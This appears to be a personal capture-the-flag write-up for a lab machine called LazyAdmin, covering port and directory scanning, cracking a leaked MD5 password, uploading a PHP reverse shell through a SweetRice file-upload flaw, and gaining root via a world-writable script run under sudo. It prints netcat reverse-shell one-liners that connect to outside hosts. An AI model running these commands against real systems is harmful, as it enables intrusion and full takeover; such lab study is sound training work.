---
tags: [Rooms]
title: LazyAdmin
created: '2020-05-22T22:46:02.478Z'
modified: '2020-05-29T22:54:48.819Z'
---

# LazyAdmin

Nmap scan of the machine:

```
nmap -sV -sC -Pn -p- 10.10.79.249 -v
```

Port 80 is open and contains a web application. The root path contains an Apache 2 default page.

We can perform a directory/file enumeration with **gobuster**:

```
gobuster dir -u http://10.10.79.249 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -e
```

We discover that there is a **/content** directory. This page discloses the use of SweetRice.

We can perform a directory/file enumeration with **gobuster** of the /content directory with .php file extensions:

```
gobuster dir -u http://10.10.79.249 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50 -e -x php
```

We discover that there is a **/content/inc** directory. This folder contains a **latest.txt** file that discloses the SweetRice version in use. It's version 1.5.1.
We also discover a folder called **mysql_backup** with a backup .sql file.
After opening this file, we obtain the credentials to login into the SweetRice application. The password is hahed as an MD5. We proceed to use john to obtain the clear text password:

```
sudo john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 sweetrice_hash.txt
```

We have the following credentials: `manager:Password123`

`NOTE: SweetRice version 1.5.1 was also vulnerable to Backup Disclosure which allowed access to the same mysql_backup folder`

This version of SweetRice is vulnerable to an Authenticated Arbitrary File Upload.

[SweetRice - Authenticated Remote File Upload](https://www.exploit-db.com/exploits/40716)

Using it, we can proceed to upload a simple PHP reverse shell.
The host is **10.10.79.249/content**, the username and password is the ones obtained before and the shell has to be renamed to **shell.php5**.

Once we have popped a shell, we can find the user.txt file at **/home/itguy**.

After executing `sudo -l` we get that there is a Perl script that can be executed as root with no password:

```
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

The **backup.pl** script executes another script called **/etc/copy.sh**.

```
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

The **copy.sh** script executes a reverse shell against a predetermined IP.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

The file **backup.pl** can only be written by root. However, the file **copy.sh** can be written by everyone.

We just need to change the reverse shell IP and port to our host machine netcat listener:

`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.5.129 1337 >/tmp/f" > /etc/copy.sh`

And then execute the Perl as root:

`sudo /usr/bin/perl /home/itguy/backup.pl`

Once we have popped a shell as root, we can find the root.txt file at **/root/root.txt**.
